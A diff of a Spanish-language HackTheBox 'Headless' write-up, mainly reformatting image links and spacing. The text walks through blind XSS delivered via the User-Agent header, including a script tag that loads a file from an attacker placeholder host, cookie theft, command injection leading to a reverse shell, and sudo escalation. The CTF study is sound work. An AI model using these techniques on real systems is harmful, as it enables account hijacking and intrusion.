@@ -116,8 +116,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # Web Site
 
 
-![[/assets/images/htb-writeup-headless/Pasted image 20240601105834.png]]
-
+![](/assets/images/htb-writeup-headless/Pasted image 20240601105834.png)
 
 Vemos que el sitio está inactivo actualmente, y podemos hacer preguntas, en el siguiente apartado de soporte:
 
@@ -142,15 +141,19 @@ el directorio soporte ya lo conocemos, qué es el que vimos para hacer pregunta,
 # XXS
 
 Comienzo viendo sí puedo llevar a cabo el **XXS** mediante un intento de obtener un recurso externo hosteado desde mi máquina, ya que al enviar los datos no representa nada en la pantalla de primeras, y hago esto para corroborar & ver sí es éxitoso.
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601110702.png)
 
 El recurso "**test.js**" lo estaba hosteando desde mi máquina a través de python por el **:80**, pero al darle a "submit" reportó esto:
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601110815.png)
+
 ha detectado el ataque, esto a qué aparentemente tiene **blacklist** para los intento de **XXS**, intenté bypassearla de varias maneras, usando hexadecimal, incluso de otras maneras contempladas en **HackTricks**, pero no logré nada éxitoso. PERO...
 
 Si leemos el mensaje, dice que la IP se reportó a los administradores para la investigación del navegador, sabemos que el navegador corresponde al **"user-agent"** en las cabeceras de la solicitud, por ende se supone que los administradores verán eso, por lo que se me ocurre ahí cargar el payload para tratar de llevar a cabo el **XXS.**
 
 Usaré **Burpsuite** como proxy para modificar la petición antes que llegue al servidor & manipular el **"user-agent"**, tal que así:
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601111954.png)
 ```bash
 <script src="http://TU_IP/test"></script>
@@ -180,15 +183,21 @@ copiamos esta cookie, abrimos nuestro navegador, y ponemos esta cookie de sesió
 y en "**value**" la ponemos.
 
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601113202.png)
+
 Ahora intento ver sí tengo permisos para ver el directorio "**/dashboard**", y...
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601113254.png)
 
 he logrado obtener una cookie válida para ver el **dashboard**, y vemos que podemos generar reportes, no veo nada interesante de primera, así que opto interceptar los reportes con **BurpSuite**.
 
 Viendo la siguiente data en la petición:
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601113658.png)
+
 intento probar inyecciones del sistema operativo, en este caso Linux.
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601113757.png)
+
 y vualá, logro ver directorios & archivos de la aplicación web, así que ya que tengo un **RCE** procedemos a enviarme una **Reverse Shell,** ganando acceso a la máquina.
 
 Nos ponemos en escucha en nuestra máquina local.
@@ -208,7 +217,9 @@ Ya tenemos la Reverse Shell, ya sólo quedaría darle tratamiento a la TTY, que 
 # Escalada de Privilegios
 
 como **dvir**, tenemos los siguiente permisos **SUDOERS**.
+
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601114453.png)
+
 podemos ejecutar sin proporcionar contraseña el binario "**syscheck**", y como el usuario que queramos, por lo que indago en búsqueda de posibles escalada de privilegios para este binario, pero no está contemplado en **GTFobins**, así que indago en su código fuente...
 
 ![](/assets/images/htb-writeup-headless/Pasted image 20240601114634.png)
